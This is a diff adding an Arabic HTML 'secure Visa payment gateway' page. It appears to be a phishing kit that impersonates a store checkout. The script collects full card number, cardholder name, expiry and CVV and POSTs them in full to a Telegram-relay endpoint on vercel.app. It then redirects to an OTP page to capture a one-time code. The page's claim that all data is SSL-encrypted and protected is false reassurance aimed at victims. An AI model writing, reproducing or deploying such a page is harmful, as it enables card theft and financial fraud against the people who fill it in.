@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>بوابة الدفع</title>
+  <style>
+    :root {
+      --bg: #f3f7ff;
+      --panel: #ffffff;
+      --muted: #64748b;
+      --text: #1a2533;
+      --primary: #2563eb;
+      --primary-dark: #1d4ed8;
+      --border: #dbeafe;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --shadow: 0 14px 38px rgba(15, 23, 42, 0.08);
+    }
+
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      font-family: "Tajawal", "Cairo", "Segoe UI", sans-serif;
+      background: linear-gradient(135deg, #edf4ff 0%, #f8fbff 100%);
+      color: var(--text);
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      padding: 32px 16px;
+    }
+
+    .payment-wrapper {
+      width: min(100%, 560px);
+    }
+
+    .form-card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 22px;
+      box-shadow: var(--shadow);
+      padding: 30px 24px 22px;
+    }
+
+    .brand {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .brand img {
+      width: 54px;
+      height: 34px;
+      object-fit: contain;
+      display: block;
+      margin: 0 auto 12px;
+      border-radius: 8px;
+      background: #fff;
+      box-shadow: 0 8px 18px rgba(37, 99, 235, 0.12);
+    }
+
+    .brand h2 {
+      margin: 0;
+      font-size: 22px;
+      color: var(--text);
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #d9e3ef;
+      border-radius: 12px;
+      background: #fafcfe;
+      color: var(--text);
+      font-size: 15px;
+      text-align: right;
+      direction: ltr;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .form-input::placeholder {
+      color: #9aa7b6;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.12);
+    }
+
+    .card-icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 42px;
+      height: 28px;
+      object-fit: contain;
+      padding: 3px;
+      border-radius: 6px;
+      background: #fff;
+      display: none;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    }
+
+    .split {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 14px;
+    }
+
+    .terms {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      background: #f8fafc;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      margin: 6px 0 10px;
+      cursor: pointer;
+    }
+
+    .terms input {
+      width: 18px;
+      height: 18px;
+      accent-color: var(--primary);
+      margin: 0;
+      cursor: pointer;
+    }
+
+    .terms span {
+      color: var(--text);
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .terms a {
+      color: var(--primary);
+      text-decoration: underline;
+    }
+
+    .btn-pay {
+      width: 100%;
+      border: 0;
+      border-radius: 14px;
+      padding: 16px 20px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: transform 0.15s ease, opacity 0.2s ease;
+      box-shadow: 0 12px 22px rgba(37, 99, 235, 0.28);
+    }
+
+    .btn-pay:hover { transform: translateY(-1px); }
+    .btn-pay:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .error-msg {
+      min-height: 18px;
+      margin-top: 6px;
+      color: var(--danger);
+      font-size: 12.5px;
+      display: none;
+    }
+
+    .error-msg.visible {
+      display: block;
+    }
+
+    .security {
+      margin-top: 18px;
+      border-radius: 10px;
+      background: #eff6ff;
+      border: 1px solid var(--border);
+      color: #475569;
+      text-align: center;
+      padding: 10px 12px;
+      font-size: 12px;
+    }
+
+    @media (max-width: 540px) {
+      .split { grid-template-columns: 1fr; }
+      .form-card { padding: 22px 16px 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-wrapper" dir="rtl">
+    <div class="form-card">
+      <div class="brand">
+        <img src="https://alshafaqstore-uae.com/assets/images/visa.png" alt="Visa" />
+        <h2>بوابة الدفع الآمنة — Visa</h2>
+      </div>
+
+      <form id="paymentForm" novalidate>
+        <div class="field">
+          <label class="label" for="cardNumber">رقم البطاقة</label>
+          <div class="input-wrap">
+            <input id="cardNumber" name="cardNumber" class="form-input" type="text" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number" />
+            <img id="visaIcon" class="card-icon" src="https://alshafaqstore-uae.com/assets/images/visa.png" alt="Visa" />
+            <img id="mastercardIcon" class="card-icon" src="https://alshafaqstore-uae.com/assets/images/master.png" alt="MasterCard" />
+          </div>
+          <div id="cardNumberError" class="error-msg"></div>
+        </div>
+
+        <div class="field">
+          <label class="label" for="cardHolder">اسم حامل البطاقة</label>
+          <input id="cardHolder" name="cardHolder" class="form-input" type="text" placeholder="الاسم كما هو على البطاقة" autocomplete="cc-name" />
+          <div id="cardHolderError" class="error-msg"></div>
+        </div>
+
+        <div class="split">
+          <div class="field">
+            <label class="label" for="expiryDateInput">تاريخ الانتهاء</label>
+            <input id="expiryDateInput" name="expiryDate" class="form-input" type="text" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
+            <div id="expiryDateError" class="error-msg"></div>
+          </div>
+
+          <div class="field">
+            <label class="label" for="cvv">CVV</label>
+            <input id="cvv" name="cvv" class="form-input" type="tel" inputmode="numeric" maxlength="4" placeholder="•••" />
+            <div id="cvvError" class="error-msg"></div>
+          </div>
+        </div>
+
+        <label class="terms" for="termsCheckbox">
+          <input type="checkbox" id="termsCheckbox" />
+          <span>أوافق على <a href="#">الشروط والأحكام</a> و <a href="#">سياسة الخصوصية</a></span>
+        </label>
+        <div id="termsError" class="error-msg"></div>
+
+        <button id="nextBtn" class="btn-pay" type="submit" disabled>🔒 المتابعة للدفع</button>
+      </form>
+
+      <div class="security">🔐 جميع البيانات مشفرة ومحمية بتقنية SSL 256-bit</div>
+    </div>
+  </div>
+
+  <script>
+    const cardNumberInput = document.getElementById('cardNumber');
+    const expiryInput = document.getElementById('expiryDateInput');
+    const cvvInput = document.getElementById('cvv');
+    const holderInput = document.getElementById('cardHolder');
+    const termsCheckbox = document.getElementById('termsCheckbox');
+    const submitBtn = document.getElementById('nextBtn');
+
+    function showError(id, message) {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.textContent = message;
+      el.classList.add('visible');
+    }
+
+    function clearError(id) {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.textContent = '';
+      el.classList.remove('visible');
+    }
+
+    function clearAllErrors() {
+      ['cardNumberError', 'cardHolderError', 'expiryDateError', 'cvvError', 'termsError'].forEach(clearError);
+    }
+
+    function isValidLuhn(num) {
+      if (!/^\d{13,19}$/.test(num)) return false;
+      let sum = 0;
+      let double = false;
+      for (let i = num.length - 1; i >= 0; i--) {
+        let digit = Number(num.charAt(i));
+        if (double) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        double = !double;
+      }
+      return sum % 10 === 0;
+    }
+
+    function isValidExpiry(val) {
+      if (!/^\d{2}\/\d{2}$/.test(val)) return false;
+      const [month, year] = val.split('/').map(Number);
+      if (month < 1 || month > 12) return false;
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+      return !(year < currentYear || (year === currentYear && month < currentMonth));
+    }
+
+    function validateRealtime() {
+      const card = cardNumberInput.value.replace(/\s+/g, '');
+      const holder = holderInput.value.trim();
+      const expiry = expiryInput.value;
+      const cvv = cvvInput.value;
+      const terms = termsCheckbox.checked;
+
+      const valid = isValidLuhn(card) && card.length >= 13 && holder.length >= 3 && isValidExpiry(expiry) && /^\d{3,4}$/.test(cvv) && terms;
+      submitBtn.disabled = !valid;
+    }
+
+    cardNumberInput.addEventListener('input', function () {
+      const visaIcon = document.getElementById('visaIcon');
+      const masterIcon = document.getElementById('mastercardIcon');
+      visaIcon.style.display = 'none';
+      masterIcon.style.display = 'none';
+
+      const digits = this.value.replace(/\D/g, '').slice(0, 16);
+      this.value = digits.replace(/(.{4})/g, '$1 ').trim();
+
+      const clean = digits.replace(/\s+/g, '');
+      if (/^4/.test(clean)) visaIcon.style.display = 'block';
+      else if (/^(5[1-5]|2[2-7])/.test(clean)) masterIcon.style.display = 'block';
+
+      validateRealtime();
+    });
+
+    holderInput.addEventListener('input', validateRealtime);
+    expiryInput.addEventListener('input', function () {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length >= 3) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+      this.value = value;
+      validateRealtime();
+    });
+
+    cvvInput.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+      validateRealtime();
+    });
+
+    termsCheckbox.addEventListener('change', validateRealtime);
+
+    const form = document.getElementById('paymentForm');
+
+    form.addEventListener('submit', async function (event) {
+      event.preventDefault();
+      clearAllErrors();
+
+      let valid = true;
+      const card = cardNumberInput.value.replace(/\s+/g, '');
+      const holder = holderInput.value.trim();
+      const expiry = expiryInput.value;
+      const cvv = cvvInput.value;
+      const terms = termsCheckbox.checked;
+
+      if (!isValidLuhn(card)) {
+        showError('cardNumberError', 'رقم البطاقة غير صحيح');
+        valid = false;
+      }
+      if (holder.length < 3) {
+        showError('cardHolderError', 'اسم حامل البطاقة مطلوب');
+        valid = false;
+      }
+      if (!isValidExpiry(expiry)) {
+        showError('expiryDateError', 'تاريخ الانتهاء غير صحيح');
+        valid = false;
+      }
+      if (!/^\d{3,4}$/.test(cvv)) {
+        showError('cvvError', 'CVV غير صحيح');
+        valid = false;
+      }
+      if (!terms) {
+        showError('termsError', 'يجب الموافقة على الشروط والأحكام');
+        valid = false;
+      }
+
+      if (valid) {
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'جارٍ الإرسال والتحويل…';
+
+        // تجميع بيانات النموذج وإرسالها إلى الـ API
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
+
+        try {
+          const response = await fetch('https://telegram-form-api-lemon.vercel.app/api/send', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+
+          const result = await response.json();
+
+          if (response.ok && result.success) {
+            // حفظ البيانات في sessionStorage لتمريرها إلى صفحة OTP
+            const digits = card.replace(/\D/g, '');
+            const last4 = digits.slice(-4);
+            const brand = /^4/.test(digits) ? 'Visa' : (/^(5[1-5]|2[2-7])/.test(digits) ? 'MasterCard' : 'Card');
+            const payment = {
+              brand: brand,
+              last4: last4,
+              masked: '•••• •••• •••• ' + last4,
+              holder: holder,
+              expiry: expiry,
+              savedAt: Date.now()
+            };
+            try {
+              sessionStorage.setItem('pk_payment', JSON.stringify(payment));
+            } catch (e) {}
+
+            // الانتقال إلى صفحة التحقق
+            window.location.href = 'otp.html';
+          } else {
+            alert('تعذر إرسال الطلب. حاول مرة أخرى.');
+            submitBtn.disabled = false;
+            submitBtn.textContent = '🔒 المتابعة للدفع';
+          }
+        } catch (error) {
+          alert('تعذر الاتصال بالخادم.');
+          submitBtn.disabled = false;
+          submitBtn.textContent = '🔒 المتابعة للدفع';
+        }
+      }
+    });
+  </script>
+</body>
+</html>
